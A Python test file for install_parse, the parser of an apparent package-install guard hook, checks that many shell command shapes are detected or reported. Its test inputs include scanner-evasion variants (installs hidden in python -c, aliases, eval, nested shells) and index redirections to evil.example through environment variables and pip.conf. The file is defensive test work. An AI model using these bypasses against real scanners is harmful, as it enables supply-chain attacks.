"""Plain-assert tests for install_parse (run: python3 tests/test_install_parse.py).

Every case is a command shape measured on 2026-10-04 against the first regex-based hook,
where it was either silently skipped (bypass) or mis-scanned. No network needed.
"""
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "guard"))
from install_parse import parse_install_command  # noqa: E402


def check(command, packages, unscanned_kinds=(), cwd=None):
    r = parse_install_command(command, cwd)
    assert r.packages == packages, f"{command!r}: packages {r.packages} != {packages}"
    kinds = tuple(u["kind"] for u in r.unscanned)
    assert kinds == tuple(unscanned_kinds), f"{command!r}: unscanned {kinds} != {tuple(unscanned_kinds)}"


# specifiers, extras, quoting: previously skipped silently
check("pip install requests>=2.0", [("requests", None)])
check("pip install 'requests>=2.0'", [("requests", None)])
check('pip install "requests[security]>=2" flask', [("requests", None), ("flask", None)])
check("pip install requests[security]", [("requests", None)])
check("pip install -U requests==2.31.0", [("requests", "2.31.0")])
# chains, redirects, prefixes
check("pip install requests==2.34.2 && echo done", [("requests", "2.34.2")])
check("cd x && pip3 install -q requests 2>&1 | tail -3", [("requests", None)])
check("FOO=1 sudo pip install requests", [("requests", None)])
check("pip install requests; pip install flask==3.0.0", [("requests", None), ("flask", "3.0.0")])
# other installers that resolve from PyPI
check("python3 -m pip install --upgrade pip setuptools", [("pip", None), ("setuptools", None)])
check("uv pip install requests==2.34.2", [("requests", "2.34.2")])
check("uv add httpx", [("httpx", None)])
check("poetry add requests@2.31.0", [("requests", "2.31.0")])
check("pipx install black", [("black", None)])
# fetch-only commands build metadata (runs setup.py of an sdist): scanned like installs
check("pip download yaml-config-loaderx==1.2.0 --no-deps -d /tmp/x", [("yaml-config-loaderx", "1.2.0")])
check("python3 -m pip wheel requests==2.31.0", [("requests", "2.31.0")])
check("pip install --dry-run pyyaml==5.3.1", [("pyyaml", "5.3.1")])
# local paths are never mistaken for package names; without a working folder their dependencies cannot be read -> asked
check("pip install .", [], ["requirements_unreadable"])
check("pip install ../pkg", [], ["requirements_unreadable"])
# sources the scanner cannot read: reported, never silently dropped
# git / URL sources over https are fetched and scanned (sources/direct.py); what cannot be fetched stays not scanned
for c in ("pip install git+https://github.com/x/y.git", "pip install https://x.org/a.tar.gz", "pip install pkg @ https://x.org/a.zip"):
    check(c, [])
    assert len(parse_install_command(c).direct_sources) == 1, c
check("pip install git+ssh://git@github.com/x/y.git", [], ["vcs_or_url"])
check("pip install http://x.org/a.tar.gz", [], ["vcs_or_url"])
check("pip install --index-url https://private.example/simple requests", [("requests", None)], ["custom_index"])
check("pip install -i https://private.example/simple requests", [("requests", None)], ["custom_index"])
check("pip install --index-url=https://pypi.org/simple requests", [("requests", None)])
check("pip install --find-links ./wheels requests", [("requests", None)], ["find_links"])
# local path with extras is local, not a VCS source
check("pip install .[dev]", [], ["requirements_unreadable"])

# project-level installs (they used to pass silently). The project's direct dependencies are read
# from its files; lock-using tools get the lock's version; pip ignores locks.
import json as _json, zipfile as _zip  # noqa: E401,E402
with tempfile.TemporaryDirectory() as t:
    d = Path(t)
    (d / "pyproject.toml").write_text('''[project]
name = "demo"
version = "0.1.0"
dependencies = ["pyyaml==5.3.1", "requests>=2"]

[project.optional-dependencies]
dev = ["pytest"]

[dependency-groups]
lint = ["ruff"]

[tool.poetry.dependencies]
python = "^3.10"
pyyaml = "5.3.1"
''')
    (d / "Pipfile").write_text('[packages]\npyyaml = "==5.3.1"\n')
    (d / "requirements.txt").write_text("pyyaml==5.3.1\n")
    (d / "uv.lock").write_text('version = 1\n[[package]]\nname = "requests"\nversion = "2.31.0"\n[[package]]\nname = "pytest"\nversion = "7.0.0"\n')
    P, R = ("pyyaml", "5.3.1"), ("requests", None)
    check("pip install pyyaml==5.3.1", [P], cwd=d)
    check("pip install -r requirements.txt", [P], cwd=d)
    check("pip install .", [P, R], cwd=d)                                   # pip resolves ranges itself: no lock pin
    check("pip install -e .[dev]", [P, R, ("pytest", None)], cwd=d)
    check("uv sync", [P, ("requests", "2.31.0"), ("pytest", "7.0.0"), ("ruff", None)], cwd=d)   # every group, lock versions
    check("uv pip sync requirements.txt", [P], cwd=d)
    check("poetry install", [P, ("requests", "2.31.0"), ("pytest", "7.0.0"), ("ruff", None)], cwd=d)
    check("pdm install", [P, ("requests", "2.31.0"), ("pytest", "7.0.0"), ("ruff", None)], cwd=d)
    check("pipenv install", [P, ("requests", "2.31.0"), ("pytest", "7.0.0"), ("ruff", None)], cwd=d)
    check("pipenv sync", [P, ("requests", "2.31.0"), ("pytest", "7.0.0"), ("ruff", None)], cwd=d)
    check("pip-sync requirements.txt", [P], cwd=d)
    check("pip-sync", [P], cwd=d)                                           # default file
    check("uv pip install -r pyproject.toml", [P, R], cwd=d)                 # a project file given with -r
    # a stale lock that no longer satisfies the (edited) manifest is not applied: the tool re-resolves
    p6 = d / "p6"; p6.mkdir()
    (p6 / "pyproject.toml").write_text('[project]\nname="x"\nversion="1"\ndependencies=["pyyaml>=5.4", "requests>=2,<3"]\n')
    (p6 / "uv.lock").write_text('[[package]]\nname = "pyyaml"\nversion = "5.3.1"\n[[package]]\nname = "requests"\nversion = "2.31.0"\n')
    check("uv sync", [("pyyaml", None), ("requests", "2.31.0")], cwd=p6)
    import install_parse as _ip  # noqa: E402
    for v, sp, ok in (("5.3.1", ">=5.4", False), ("6.0", ">=5.4", True), ("2.31.0", ">=2,<3", True), ("3.0", ">=2,<3", False),
                      ("1.4.2", "~=1.4", True), ("2.0", "~=1.4", False), ("1.0", "", True), ("1.0", "===1.0", True)):
        assert _ip.satisfies(v, sp) == ok, (v, sp)
    _saved = {k: sys.modules.get(k) for k in ("packaging.specifiers", "packaging.version")}
    sys.modules["packaging.specifiers"] = None                                  # no `packaging`: the built-in comparison
    try:
        for v, sp, ok in (("5.3.1", ">=5.4", False), ("6.0", ">=5.4", True), ("3.0", ">=2,<3", False), ("2.0", "~=1.4", False)):
            assert _ip.satisfies(v, sp) == ok, ("fallback", v, sp)
    finally:
        for k, m in _saved.items():
            if m is None:
                sys.modules.pop(k, None)
            else:
                sys.modules[k] = m
    check("pipenv install flask", [("flask", None)], cwd=d)                # with a package: only that package
    check("cd x && uv sync --directory sub", [], ["requirements_unreadable"], cwd=d)    # folder without project files
    # poetry ranges + poetry.lock, Pipfile.lock only, setup.py only, dynamic deps, local wheel, local sdist
    p2 = d / "p2"; p2.mkdir()
    (p2 / "pyproject.toml").write_text('[tool.poetry.dependencies]\npython = "^3.10"\njinja2 = "^2.10"\n[tool.poetry.group.dev.dependencies]\nblack = "22.1.0"\n')
    (p2 / "poetry.lock").write_text('[[package]]\nname = "Jinja2"\nversion = "2.10.1"\n')
    check("poetry install -C p2", [("jinja2", "2.10.1"), ("black", "22.1.0")], cwd=d)
    p3 = d / "p3"; p3.mkdir()
    (p3 / "Pipfile.lock").write_text(_json.dumps({"default": {"urllib3": {"version": "==1.25.0"}}, "develop": {}}))
    check("cd p3 && pipenv sync", [("urllib3", "1.25.0")], cwd=d)          # `cd` is followed: p3's lock, not d's files
    check("cd $DIR && uv sync", [], ["requirements_unreadable"], cwd=d)      # folder unknown after a non-literal cd
    check("pipenv sync", [("urllib3", "1.25.0")], cwd=p3)
    p4 = d / "p4"; p4.mkdir(); (p4 / "setup.py").write_text("from setuptools import setup\nsetup(install_requires=['x'])\n")
    check("pip install ./p4", [], ["requirements_unreadable"], cwd=d)
    p5 = d / "p5"; p5.mkdir(); (p5 / "pyproject.toml").write_text('[project]\nname="x"\nversion="1"\ndynamic=["dependencies"]\n')
    check("pip install ./p5", [], ["requirements_unreadable"], cwd=d)
    whl = d / "dist" / "foo-1.0-py3-none-any.whl"; whl.parent.mkdir()
    with _zip.ZipFile(whl, "w") as z:
        z.writestr("foo-1.0.dist-info/METADATA", "Name: foo\nRequires-Dist: pyyaml==5.3.1\nRequires-Dist: pytest ; extra == 'test'\n")
    check("pip install ./dist/foo-1.0-py3-none-any.whl", [P], cwd=d)
    (d / "dist" / "foo-1.0.tar.gz").write_bytes(b"x")
    check("pip install ./dist/foo-1.0.tar.gz", [], ["requirements_unreadable"], cwd=d)
    (d / "bad").mkdir(); (d / "bad" / "pyproject.toml").write_text("[project\n")
    check("pip install ./bad", [], ["requirements_unreadable"], cwd=d)     # broken file: asked, not passed
    check("pip install -e ./missing", [], cwd=d)                            # nothing there: pip fails, nothing installed

# the guard's "is this an install?" test (decides whether a guard failure is shown) knows the project commands too
from guard_core import _INSTALLISH  # noqa: E402
for c in ("uv sync", "uv pip sync r.txt", "poetry install", "pdm install", "pipenv sync", "pip-sync", "pip install ."):
    assert _INSTALLISH.search(c), c
assert not _INSTALLISH.search("git status") and not _INSTALLISH.search("ls -la")
# variables / command substitution: we cannot know what is installed -> reported, not guessed
check("PKG=requests; pip install $PKG", [], ["unparsed"])
check("pip install $(cat deps.txt)", [], ["unparsed"])
# download-and-run tools
check("uvx ruff", [("ruff", None)])
check("uvx --from httpie http GET x.org", [("httpie", None)])   # --from names the package; the first operand is the command
check("pipx run cowsay hello", [("cowsay", None)])
check("uv tool install ruff", [("ruff", None)])
check("uv tool run black .", [("black", None)])
check("uv run --with requests python x.py", [("requests", None)])
check("pdm add requests", [("requests", None)])
# not install commands
for c in ("ls -la", "echo pip install nothing", "pip list | grep requests", "pip install 'unbalanced"):
    check(c, [])

# requirements files: contents are scanned, nested -r followed, constraints ignored
with tempfile.TemporaryDirectory() as d:
    (Path(d) / "requirements.txt").write_text(
        "requests==2.31.0\n# comment\nflask>=2.0  # trailing\n-e .\n--index-url https://pypi.org/simple\n"
        'numpy[extra]~=1.2; python_version>"3.8"\ngit+https://github.com/x/y.git#egg=y\n-r base.txt\n-c constraints.txt\n')
    (Path(d) / "base.txt").write_text("click\n--extra-index-url https://private.example/simple\n")
    want = [("requests", "2.31.0"), ("flask", None), ("numpy", None), ("click", None)]
    check("pip install -r requirements.txt", want, ["requirements_unreadable", "custom_index"], d)   # `-e .` with no project files: asked
    check("pip install --no-cache-dir -rrequirements.txt", want, ["requirements_unreadable", "custom_index"], d)
    assert [s["url"] for s in parse_install_command("pip install -r requirements.txt", d).direct_sources] == ["https://github.com/x/y.git"]
    check("pip install -r missing.txt", [], ("requirements_unreadable",), d)   # not there yet (often written by the same command): ask

# constraints (-c): install nothing themselves, but pip then installs the pinned version of whatever else asks for the
# package; an unpinned `pyyaml` in requirements.txt must therefore be judged as the constrained 5.3.1, not the latest release
with tempfile.TemporaryDirectory() as d:
    (Path(d) / "requirements.txt").write_text("pyyaml\nrequests>=2\nflask==3.0.0\n")
    (Path(d) / "constraints.txt").write_text("# approved versions\npyyaml==5.3.1\nRequests==2.31.0\nflask==2.0.0\nnumpy>=1\n")
    want = [("pyyaml", "5.3.1"), ("requests", "2.31.0"), ("flask", "3.0.0")]      # an explicit pin in the requirement itself wins
    check("pip install -r requirements.txt -c constraints.txt", want, (), d)
    check("pip install -c constraints.txt -r requirements.txt", want, (), d)
    check("pip install pyyaml --constraint constraints.txt", [("pyyaml", "5.3.1")], (), d)
    check("pip install pyyaml --constraint=constraints.txt", [("pyyaml", "5.3.1")], (), d)
    check("pip install -r requirements.txt", [("pyyaml", None), ("requests", None), ("flask", "3.0.0")], (), d)   # no -c: unchanged
    (Path(d) / "req2.txt").write_text("-c constraints.txt\npyyaml\n")
    check("pip install -r req2.txt", [("pyyaml", "5.3.1")], (), d)                                                # -c inside a requirements file
    (Path(d) / "outer.txt").write_text("-c constraints.txt\n")
    (Path(d) / "constraints2.txt").write_text("-c outer.txt\n")
    check("pip install pyyaml -c constraints2.txt", [("pyyaml", "5.3.1")], (), d)                                # nested constraints
    check("pip install pyyaml -c missing.txt", [("pyyaml", None)], (), d)                                         # pip itself fails

# more packages than the per-command cap: the extra ones must be reported as unscanned, never silently ignored
with tempfile.TemporaryDirectory() as d:
    lines = [f"pkg-{i:03d}-example" for i in range(200)] + ["pyyaml==5.3.1", "tail-pkg"]
    (Path(d) / "requirements.txt").write_text("\n".join(lines) + "\n")
    parsed = parse_install_command("pip install -r requirements.txt", d)
    assert len(parsed.packages) == 200 and ("pyyaml", "5.3.1") not in parsed.packages, parsed.packages[-2:]
    assert [u["kind"] for u in parsed.unscanned] == ["too_many_packages"], parsed.unscanned
    parsed = parse_install_command("pip install -r requirements.txt", d)
    small = parse_install_command("pip install requests flask", d)
    assert small.unscanned == [], small.unscanned                      # nothing flagged under the cap

# wrappers, shells, newlines, index settings in the environment (USER_SCENARIO_REVIEW_2026-10-15 G1-G7: all passed silently)
check("timeout 60 pip install pyyaml==5.3.1", [("pyyaml", "5.3.1")])
check("timeout -k 5 --signal=KILL 2m pip install six", [("six", None)])
check("env pip install six", [("six", None)])
check("env -u HOME FOO=1 pip install six", [("six", None)])
check("nice -n 10 pip install six", [("six", None)])
check("stdbuf -o L pip install six", [("six", None)])
check("sudo -u bob -H pip install six", [("six", None)])
check("bash -c 'pip install six==1.16.0'", [("six", "1.16.0")])
check('sh -lc "cd /tmp && pip install six"', [("six", None)])
check("eval pip install six", [("six", None)])
check("bash -c \"bash -c 'pip install six'\"", [("six", None)])
check("uv run pip install six", [("six", None)])
check("poetry run pip install six", [("six", None)])
check("hatch run pip install six", [("six", None)])
check("python -m uv pip install six", [("six", None)])
check("xargs pip install < r.txt", [], ("unparsed",))
check("PIP_INDEX_URL=https://evil.example/simple pip install six", [("six", None)], ("custom_index",))
check("PIP_INDEX_URL=https://pypi.org/simple pip install six", [("six", None)])
check("export UV_INDEX_URL=https://evil.example/simple && uv pip install six", [("six", None)], ("custom_index",))
check("export PIP_INDEX_URL=https://evil.example/simple", [])                      # not an install: nothing to say
check("PIP_FIND_LINKS=/tmp/w pip install six", [("six", None)], ("find_links",))
r = parse_install_command("pip install six", None, env={"PIP_INDEX_URL": "https://evil.example/simple"})
assert [u["kind"] for u in r.unscanned] == ["custom_index"], r.unscanned           # set before the session started
r = parse_install_command("ls -la", None, env={"PIP_INDEX_URL": "https://evil.example/simple"})
assert r.unscanned == [] and r.packages == []
check("echo hi\npip install six", [("six", None)])
check("echo 'a\npip install six'", [])                                            # a quoted newline is not a command
with tempfile.TemporaryDirectory() as d:
    check("cat > req.txt <<EOF\nsix==1.16.0\nEOF\npip install -r req.txt", [], ("requirements_unreadable",), d)
    Path(d, "req.txt").write_text("six==1.16.0\n")
    check("pip install -r req.txt", [("six", "1.16.0")], (), d)                                      # existing file is read
    check("cat > req.txt <<EOF\nevil\nEOF\npip install -r req.txt", [], ("requirements_unreadable",), d)   # ...unless this command rewrites it
    check("echo evil >> req.txt && pip install -r req.txt", [], ("requirements_unreadable",), d)
    check("curl -o req.txt https://x/r.txt && pip install -r req.txt", [], ("requirements_unreadable",), d)
    check("echo hi > log.txt && pip install -r req.txt", [("six", "1.16.0")], (), d)                 # other files do not matter
    Path(d, "pyproject.toml").write_text('[project]\nname="a"\nversion="0"\ndependencies=["six==1.16.0"]\n')
    r = parse_install_command("cat > pyproject.toml <<EOF\n[project]\nEOF\npip install .", d)
    assert "requirements_unreadable" in [u["kind"] for u in r.unscanned], r.unscanned

# bypasses found 2026-10-23 (50 command variants): each is parsed or reported, never a silent pass
check("python3 -c 'import subprocess; subprocess.run([\"pip\",\"install\",\"evilpkg\"])'", [("evilpkg", None)])
check("python3 -c \"import os; os.system('pip install evilpkg')\"", [("evilpkg", None)])
check("python3 -c 'import subprocess,sys; subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\", \"evilpkg==1.0\"])'",
      [("evilpkg", "1.0")])
check("python3 -c 'import os; os.system(cmd)  # pip install'", [], ("unparsed",))       # install hinted, target unknown
check("python3 -c 'import sys; print(sys.path)'", [])                                  # ordinary inline code
check("python3 script.py", [])
check("P=pip; $P install evilpkg", [("evilpkg", None)])
check("alias p=pip; p install evilpkg", [("evilpkg", None)])
check("$TOOL install evilpkg", [], ("unparsed",))
check("echo $HOME", [])
check("easy_install evilpkg", [("evilpkg", None)])
check("conda install numpy", [], ("other_ecosystem",))
check("mamba create -n x python", [], ("other_ecosystem",))
check("pixi add requests", [], ("other_ecosystem",))
check("conda list", [])
with tempfile.TemporaryDirectory() as d:
    Path(d, "setup.py").write_text("from setuptools import setup\nsetup(name='a', install_requires=['six==1.16.0'])\n")
    r = parse_install_command("python setup.py install", d)
    assert r.project_installs and r.installs, (r.project_installs, r.unscanned)
for c in ("python setup.py develop", "easy_install x", "conda install numpy", "mamba install x", "pixi add x",
          "P=pip; $P install x", "alias p=pip; p install x", "python3 -c 'import os; os.system(\"pip install x\")'"):
    assert _INSTALLISH.search(c), c
assert not _INSTALLISH.search("conda list") and not _INSTALLISH.search("echo $HOME")

# index settings in configuration files (2026-10-23): the guard scans PyPI, so another index means scanning the wrong file.
# Changing the setting is "index_setting" (auto mode lets it through when nothing is installed in the same command); an
# install that then reads the setting is "custom_index".
with tempfile.TemporaryDirectory() as home, tempfile.TemporaryDirectory() as proj:
    env = {"HOME": home}
    def kinds(c):
        return [(u["kind"], u["text"]) for u in parse_install_command(c, proj, env=env).unscanned]
    assert kinds("pip install requests") == []
    assert kinds("pip config set global.index-url https://evil.example/simple")[0][0] == "index_setting"
    assert kinds("python3 -m pip config edit")[0][0] == "index_setting"
    assert kinds("poetry source add evil https://evil.example/simple")[0][0] == "index_setting"
    assert kinds("pdm config pypi.url https://evil.example/simple")[0][0] == "index_setting"
    assert kinds("pip config list") == [] and kinds("cat ~/.config/pip/pip.conf") == []
    assert kinds("echo '[global]' > ~/.config/pip/pip.conf")[0] == ("index_setting", "pip.conf")
    Path(home, ".config/pip").mkdir(parents=True)
    Path(home, ".config/pip/pip.conf").write_text("[global]\nindex-url = https://evil.example/simple\n")
    got = kinds("pip install requests")
    assert got and got[0][0] == "custom_index" and "evil.example" in got[0][1], got
    assert kinds("uv add requests") == []                       # uv does not read pip.conf
    Path(home, ".config/pip/pip.conf").write_text("[global]\nindex-url = https://pypi.org/simple\nfind-links = /tmp/w\n")
    assert [k for k, _ in kinds("pip install requests")] == ["find_links"]
    Path(home, ".config/pip/pip.conf").unlink()
    Path(proj, "pyproject.toml").write_text('[project]\nname="a"\nversion="0"\ndependencies=["six"]\n'
                                            '[[tool.uv.index]]\nname="corp"\nurl="https://corp.example/simple"\n'
                                            '[[tool.poetry.source]]\nname="p"\nurl="https://p.example/simple"\n')
    assert "corp.example" in kinds("uv sync")[0][1] and "corp.example" in kinds("uv add six")[0][1]
    assert "p.example" in kinds("poetry add six")[0][1]
    assert kinds("pip install six") == []                       # pip ignores poetry/uv sources
for c in ("pip config set global.index-url x", "poetry source add a b", "pdm config pypi.url x", "echo x > ~/.pip/pip.conf"):
    assert _INSTALLISH.search(c), c

# `python script.py` that installs from inside the script: only real call sites count (AST), not text that mentions pip
with tempfile.TemporaryDirectory() as d:
    scripts = {
        "a.py": 'import subprocess, sys\nsubprocess.check_call([sys.executable, "-m", "pip", "install", "six==1.16.0"])\n',
        "b.py": 'import os\nos.system("pip install colorama")\n',
        "c.py": 'import subprocess, sys\nfor p in PKGS:\n    subprocess.run([sys.executable, "-m", "pip", "install", p])\n',
        "d.py": 'import pip\npip.main(["install", "flask"])\n',
        "quiet.py": '"""Run pip install foo first."""\nimport subprocess\nprint("pip install bar")\nsubprocess.run(["git", "add", "."])\n',
    }
    for name, text in scripts.items():
        Path(d, name).write_text(text)
    check("python a.py", [("six", "1.16.0")], cwd=d)
    check("python3 -u b.py --flag", [("colorama", None)], cwd=d)
    check("python c.py", [], ["unparsed"], cwd=d)
    check("python d.py", [("flask", None)], cwd=d)
    check("python quiet.py", [], cwd=d)
    check(f"cd / && python {d}/b.py", [("colorama", None)], cwd=d)
    check("python missing.py", [], cwd=d)
    check("cat > s.py <<EOF\nprint(1)\nEOF\npython s.py", [], cwd=d)
    check("cat > s.py <<EOF\nimport os; os.system('pip install ' + n)\nEOF\npython s.py", [], ["unparsed"], cwd=d)

# local wheels / sdists are scanned (their code), and one downloaded in the same command cannot be read yet
with tempfile.TemporaryDirectory() as d:
    Path(d, "tool-1.0-py3-none-any.whl").write_bytes(b"")
    Path(d, "tool-1.0.tar.gz").write_bytes(b"")
    r = parse_install_command("pip install ./tool-1.0-py3-none-any.whl tool-1.0.tar.gz", d)
    assert [x[0] for x in r.local_files] == ["./tool-1.0-py3-none-any.whl", "tool-1.0.tar.gz"], r.local_files
    for c in ("curl -sLO https://e.example/x-1.0-py3-none-any.whl && pip install ./x-1.0-py3-none-any.whl",
              "wget https://e.example/a/y-1.0.tar.gz; pip install y-1.0.tar.gz",
              "curl -o z.whl https://e.example/q && pip install z.whl"):
        r = parse_install_command(c, d)
        assert not r.local_files and [u["kind"] for u in r.unscanned] == ["requirements_unreadable"], (c, r.unscanned)
    assert parse_install_command("pip install ./missing-1.0-py3-none-any.whl", d).local_files == []

print("install_parse: all cases passed")
